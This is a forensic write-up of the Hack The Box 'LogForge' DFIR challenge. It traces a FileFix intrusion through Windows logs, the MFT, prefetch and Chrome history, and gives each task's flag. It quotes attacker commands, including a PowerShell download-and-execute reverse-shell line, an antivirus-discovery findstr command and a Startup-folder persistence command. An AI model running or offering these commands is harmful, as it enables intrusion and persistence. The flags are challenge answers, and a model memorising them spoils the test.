---
title: "HTB DFIR Sherlock: LogForge"
type: "posts"
author: WildPasta
author_url: "https://medium.com/@wildpasta"
published: 2026-05-13
source: Medium
draft: true
toc: false
categories: ["writeups"]
tags: ["hackthebox", "dfir", "writeups"]
---

### HTB DFIR Sherlock: LogForge

I've been away from Sherlocks for a bit so let's dive into this new Windows' DFIR box. We have to deal with a FileFix attack that the intruder used to establish persistence across the system with a malicious js script. This write-up covers mainly Sysmon logs analysis, and a bit of typical artifact parsing such as MFT.

---

> Task 1: When was the user’s last successful login to the system?

Filter on Event ID 4624 to show only the successful logons.

{{< image src="images/Latest_successful_access_to_host__source_8491.png" alt="Latest successful access to host (source: Security.evtx)" caption="Latest successful access to host (source: Security.evtx)" >}}

This logon is a Type 2, meaning it was likely a legitimate connection to the computer where the user interactively input his credentials.

{{< admonition type=success title="FLAG" open=false >}}
2025-08-11 06:46:52
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 2: When did the victim last open the browser they regularly used on the system?

Dump the prefetch database to find a Chrome execution short after the login of Task 1. This artifact give the execution timestamp of our Chrome browser.

{{< image src="images/Lastest_Google_Chrome_execution__source__6829.png" alt="Lastest Google Chrome execution (source: prefetch database)" caption="Lastest Google Chrome execution (source: prefetch database)" >}}

{{< admonition type=success title="FLAG" open=false >}}
2025-08-11 07:12:17
{{< /admonition >}}

{{< admonition type=tip title="Dumping prefetch" open=true >}}
Here is the full command line used to dump the prefetch database:

```powershell
PECmd -d ".\LogForge\dump\C\Windows\prefetch\" --csv ".\LogForge\analysis\"
```
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 3: The user accessed a malicious website as a result of phishing attempt. What is the URL?

You have to browse the **Chrome History** database in `%localappdata%\google\chrome\user data\default` to find out the URL opened by the user when he clicked the link.
The `urls` table display a shared link with someone named 0xSh3rlock (must a be h@k3r for sure).

{{< image src="images/Malicious_website_accessed_by_the_user___4085.png" alt="Malicious website accessed by the user (source: Chrome History)" caption="Malicious website accessed by the user (source: Chrome History)" >}}

{{< admonition type=success title="FLAG" open=false >}}
https://cool-bunny-55393d.netlify.app/
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 4: After the user visited the website, they were directed to copy a command from the website and enter it into the File Explorer search bar. Shortly after, strange behavior was noticed. What is the full URL that installed the reverse shell on the victim’s device?

You have to check out the Powershell History in Timeline Explorer to find out that the pasted command was a reverse shell download.

```powershell
#timestamp 2025-08-11 07:14:20 in powershell channel
[SNIP] IEX(New-Object Net.WebClient).DownloadString('http://192.168.26.128:8000/rev.ps1')
```

{{< style "height:2rem;" >}}{{< /style >}}
> Task 5: This attack preys on non-technical users by luring them into traps and manipulating them into unknowingly executing commands on the system. Based on the analysis of the previously identified command, what is this type of attack called?

At first, I thought this may be a ClickFix attack since it's been trendy for months now. However, it was a tad more subtle. **Here, we are facing a FileFix attack!** In the scenario, the user is prompted to paste a command in his file explorer. The payload contains a **Powershell script** that act as a reverse shell in this case.

{{< admonition type=success title="FLAG" open=false >}}
FileFix
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 6: After the attack, the user noticed that Notepad had opened with a message left by the attacker. What is the email address of the attacker?

Loading the MFT in MFT Explorer, you can see the presence of a file named *README.txt* in the Public directory. The preview (ugly rendering of UTF-16 btw) displays the ransom message including our h@ker email address.

{{< image src="images/Content_of_README_dropped_on_the_Desktop_6988.png" alt="Content of README dropped on the Desktop (source: MFT Explorer)" caption="Content of README dropped on the Desktop (source: MFT Explorer)" >}}

{{< admonition type=success title="FLAG" open=false >}}
0xSh3rl0cK@protonmail.com
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 7: The attacker downloaded malware to infect the victim’s device. What is the full path of the malicious malware file?

Firing up SysmonView for a nice graph view, you can find that our malicious powershell intance dropped a **WindowsUpdate.exe** file on host.

{{< image src="images/Malicious_file_dropped_by_revshell_ps1___4113.png" alt="Malicious file dropped by revshell.ps1 (source: Sysmon Operational)" caption="Malicious file dropped by revshell.ps1 (source: Sysmon Operational)" >}}

{{< admonition type=tip title="NB" open=true >}}
This can also be found in the **$MFT** right after the *revshell.ps1* execution.
{{< /admonition >}}

{{< admonition type=success title="FLAG" open=false >}}
C:\Windows\Temp\WindowsUpdate.exe
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 8: What is the product name of this malicious file?

This one was a real pain in the butt to find. It wasn't shown in the SysmonView and I had to parse Timeline Explorer raw content to find it. After filtering on *windowsupdate.exe* I looked up the first process creation in detail. It happens that it held the wanted product name.

{{< image src="images/Product_name_of_windowsupdate_exe__sourc_7094.png" alt="Product name of windowsupdate.exe (source: Sysmon Operational)" caption="Product name of windowsupdate.exe (source: Sysmon Operational)" >}}

{{< admonition type=success title="FLAG" open=false >}}
Virtuoso
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 9: The malware created several directories on the system. Under which path were these files created?

By looking for filesystem interaction with our new uncovered malware, we have few entries in the FileCreate Event. One of them is directory creation under Windows folder.

{{< image src="images/Creation_of_directory_by_the_intruder__s_9932.png" alt="Creation of directory by the intruder (source: Sysmon Operational)" caption="Creation of directory by the intruder (source: Sysmon Operational)" >}}

{{< admonition type=success title="FLAG" open=false >}}
C:\Windows\
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 10: A script file was staged on the machine by the malware. What is the full command used to achieve this?

While I was looking for Task 9 (folders creation) I came across another funny command line executed by our malicious file. It happened to be the flag for this Task.

{{< image src="images/Malicious_script_dropped_bu_windowsupdat_3066.png" alt="Malicious script dropped bu windowsupdate.exe (source: Sysmon Oprational)" caption="Malicious script dropped bu windowsupdate.exe (source: Sysmon Oprational)" >}}

{{< admonition type=success title="FLAG" open=false >}}
"C:\Windows\System32\cmd.exe" /c copy Cricket Cricket.bat & Cricket.bat
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 11: What is the full path of the staged script file?

The file copy was done from the location of the parent process (being windowsupdate) which is in `%systemroot%\Temp`. We can confirm that by browsing the MFT which holds the record for the newly Cricket.bat file.

{{< image src="images/Location_of_malicious_dropped_script__so_2445.png" alt="Location of malicious dropped script (source: MFT)" caption="Location of malicious dropped script (source: MFT)" >}}

{{< admonition type=success title="FLAG" open=false >}}
C:\Users\user\AppData\Local\Temp\Cricket.bat
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 12: The attacker dropped an automation utility on the system with a legacy file format. What is the full path of this newly dropped file?

Looking at the Cricket logs in the EVTX, we find a weird looking *Intranet.pif* file:

{{< image src="images/Automation_utility_dropping_on_the_file__880.png" alt="Automation utility dropping on the file system (source: Sysmon Operational)" caption="Automation utility dropped on the file system (source: Sysmon Operational)" >}}

It's a Windows shortcut file that was historically used to configure how DOS and 16-bit applications execute on modern Windows 🧐. It matches the legacy format mentioned initially.

The full path of the file can be found in the $MFT.

{{< image src="images/Automation_utility_dropped_on_the_file_s_201.png" alt="Automation utility dropped on the file system (source: MFT)" caption="Automation utility dropped on the file system (source: MFT)" >}}

{{< admonition type=success title="FLAG" open=false >}}
C:\Users\user\AppData\Local\Temp\316094\Intranet.pif
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 13: What is the name and version of the utility?

At the start of the Sherlock, I ran a chainsaw analysis but couldn't find anything useful on it *at first glance*. But I noticed a field reading *Renamed AutoIt Execution*.

Its timestamp matches the drop of *Intranet.pif* on the compromised filesystem. So I dug a bit deeper and found out that it was right under my eyes this whole time!

{{< image src="images/Executable_details__source__Sysmon_Opera_6581.png" alt="Executable details (source: Sysmon Operational)" caption="Executable details (source: Sysmon Operational)" >}}

{{< admonition type=success title="FLAG" open=false >}}
AutoIt 3.3.14.3
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 14: Using this utility, the attacker dropped another script on the system. What is the name of this script?

Here I decided to fire up SysmonView for a better (and quicker) understanding of the situation. Our *Intranet.pif* executable dropped a malicious script on the compromised host.

{{< image src="images/Virtuoso_js_script_creation_by_Intranet__6810.png" alt="Virtuoso.js script creation by Intranet.pif (source:Sysmon Operational)" caption="Virtuoso.js script creation by Intranet.pif (source:Sysmon Operational)" >}}

{{< admonition type=success title="FLAG" open=false >}}
Virtuoso.js
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 15: In order to evade defenses for unattended access, the malware executed commands to look for EDR and antivirus presence on the system. What is the full command line of the second command used to achieve this?

Let's go back to our suspicious Cricket.bat. What other command lines did the attacker execute using this? You have to filter on ParentCommandLine in Sysmon logs.

{{< image src="images/EDR_discovery_on_the_compromised_host__s_2201.png" alt="EDR discovery on the compromised host (source: Sysmon Operational)" caption="EDR discovery on the compromised host (source: Sysmon Operational)" >}}

{{< admonition type=success title="FLAG" open=false >}}
findstr -I "avastui avgui bdservicehost nswscsvc sophoshealth"
{{< /admonition >}}

{{< style "height:2rem;" >}}{{< /style >}}
> Task 16: What is the full command used to set up persistence on the system?

Here simply look at the event log for any interaction from our virtuoso script. There is a rather explicit command where persistence is installed across Start Menu shortcut.

{{< image src="images/Established_persistence_across_the_host__1162.png" alt="Established persistence across the host (source: Sysmon Operational)" caption="Established persistence across the host (source: Sysmon Operational)" >}}

{{< admonition type=success title="FLAG" open=false >}}
```powershell
cmd /k echo [InternetShortcut] > "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virtuoso.url" & echo URL="C:\Users\user\AppData\Local\Immersive Creations Co\Virtuoso.js" >> "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virtuoso.url" & exit
```
{{< /admonition >}}

---

This was a box where I improved my Sysmon comprehension. I learned that SysmonView is always a must have for bigger investigation to have a clear global view. However, some question requiring raw parsing are a huge downside.

*NB: My write-up are written by myself, without any AI assistance. Excuse my poor english, I chose to share raw content.*

{{< image src="images/LogForge_success_banner_8695.png" alt="LogForge success banner" caption="LogForge success banner" >}}
